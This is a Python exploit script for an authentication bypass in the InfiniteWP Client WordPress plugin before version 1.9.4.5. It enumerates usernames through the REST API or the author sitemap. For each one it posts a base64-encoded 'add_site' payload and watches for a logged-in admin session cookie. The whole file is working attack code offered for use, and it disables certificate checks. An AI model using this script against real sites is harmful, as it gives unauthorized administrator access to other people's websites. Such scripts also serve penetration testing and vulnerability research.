#
# InfiniteWP Client < 1.9.4.5 - Authentication Bypass
#
# Exploit Script By @random_robbie
#
# Will only work with python 2.7 sadly!
#
# Requires Wordpress API Users Exposed!
#
# Based off https://0day.work/infinitewp-client-1-9-4-5-authentication-bypass/
#
import requests
import json
import sys
import base64
import argparse
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()


parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", required=True, help="Wordpress URL")
parser.add_argument("-m", "--method", required=True, help="Please Use -m rest for rest api or -m sitemap for yoast seo authors site map")
args = parser.parse_args()
url = args.url
method = args.method



proxies = {"http": "http://127.0.0.1:8085","https": "http://127.0.0.1:8085"}




def test_user(url,user):
	print ("[*] Testing User "+user+" [*]")
	payload = '''{
"iwp_action": "add_site",
"id": 2,
"params": {
"username": "'''+user+'''"
}
}'''
	base64d = base64.b64encode(payload)
	payloadstring = "_IWP_JSON_PREFIX_"+base64d+""
	paramsPost2 = {""+payloadstring+""}
	headers2 = {"User-Agent":"curl/7.67.0","Connection":"close","Accept":"*/*","Content-Type":"application/x-www-form-urlencoded"}
	response2 = session.post(url, data=payloadstring, headers=headers2,verify=False, proxies=proxies)
	if 'wordpress_logged_in' in str(response2.headers):
		print("[*]Found Admin User: "+user+"[*]") 
		print(response2.headers)
	
	
	




def grab_users_api(url):
	headers = {"User-Agent":"curl/7.54.0","Connection":"close","Accept":"*/*"}
	response = session.get(""+url+"/wp-json/wp/v2/users", headers=headers,verify=False)
	if 'rest_user_cannot_view' in response.content:
		print ("Api End Point Requires Permissions\n\n")
		sys.exit()
	if response.status_code == 200:
		print("[*]Users Found[*]")
		jsonstr = json.loads(response.content)
		for id in jsonstr:
			userid = str(id['id'])
			userint = id['id']
			user = id['slug']
			print ("Found User: "+user+" with ID: "+userid+"")
			test_user(url,user)

def grab_users_sitemap(url):
	headers = {"User-Agent":"curl/7.54.0","Connection":"close","Accept":"*/*"}
	response = session.get(""+url+"/author-sitemap.xml", headers=headers,verify=False)
	if response.status_code == 404:
		print("No Author SiteMap Found - 404")
	if response.status_code == 200:
		print("[*]Users Found[*]")
        auth = re.findall(r'(<loc>(.*?)</loc>)\s',response.content)
        for user in auth:
        	thisuser = user[1]
        	h = thisuser.split('/')
        	realuser = h[4]
        	test_user(url,realuser)
       
		
if method == "rest":
	grab_users_api(url)
elif method == "sitemap":
	grab_users_sitemap(url)
else:
	print ("Please Choose Method of rest or sitemap")
